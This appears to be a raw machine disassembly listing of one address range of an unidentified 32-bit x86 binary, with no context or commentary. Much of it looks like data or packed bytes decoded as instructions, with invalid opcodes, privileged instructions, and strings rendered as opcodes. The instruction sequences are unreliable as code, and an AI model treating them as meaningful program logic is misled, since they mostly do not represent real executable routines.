  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
